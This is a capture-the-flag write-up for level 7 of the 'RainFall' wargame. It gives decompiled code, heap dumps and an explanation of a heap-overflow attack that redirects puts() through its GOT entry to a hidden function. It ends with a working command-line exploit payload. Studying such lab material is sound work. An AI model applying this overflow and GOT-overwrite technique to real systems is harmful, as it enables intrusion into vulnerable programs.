# Level7

## Code
```
#include <stdio.h>
#include <stdlib.h>

char c[80] = "";

void m()
{
    printf("%s - %d\n", &c, time(NULL));
}

int main(int argc, char** argv)
{
    int* s1 = malloc(8);
    s1 = 1;
    s1[1] = malloc(8);
    int s2 = malloc(8);
    *s2 = 2;
    s2[1] = malloc(8);

    strcpy(s1[1], argv[1]);
    strcpy(s2[1], argv[2]);

    fgets(&c, 68, fopen("/home/user/level8/.pass", "r"));
    puts("~~");
    return (0);
}
```


## Explanation

- Here, the main() calls malloc 4 times before using the 2nd and 4th as the dest for strcpy() of
    argv[1] and argv[2].

- Thanks to ltrace, we can see the addresses allocated by calls to malloc() :
```
level7@RainFall:~$ ltrace ./level7
    __libc_start_main(0x8048521, 1, 0xbffff804, 0x8048610, 0x8048680 <unfinished ...>
    malloc(8)                                           = 0x0804a008
    malloc(8)                                           = 0x0804a018
    malloc(8)                                           = 0x0804a028
    malloc(8)                                           = 0x0804a038
```
- We can exploit strcpy to overflow a buffer.

- When we display the heap in gdb after the 2 calls to strcpy with argv[1] = "AAAA" and argv[2] = "BBBB"
    we get the following output :
```
(gdb)  x/120x 0x804a000
    0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
    0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
    0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
    0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
    0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
    0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
```
- We can see our 2 strings very clearly, and we can also see the 2 addresses of these strings
    , which are the return values of 2nd and 4th calls to malloc() next to the values 1 and 2.

- The idea here is to overflow argv[1] to fill the memory until the spot where the address of the
    2nd string is, in order to replace this address with the GOT entry for puts().

- Then, the second strcpy will jump there instead of the original spot in the heap, and write argv[2]
    which will contain the address of the winning function m().

- This way, when the program calls puts(), the GOT entry tells it that puts() is at the address of m().

## Exploit
- This is the final payload: 
```
$   ./level7 "$(python -c "print 'A'*20+'\x28\x99\x04\x08'")" $(python -c "print '\xf4\x84\x04\x08'")
``` 

argv[1] :
        20 random bytes to reach the desired address
    +   the GOT entry for puts()
argv[2] :
        the address of m()
     
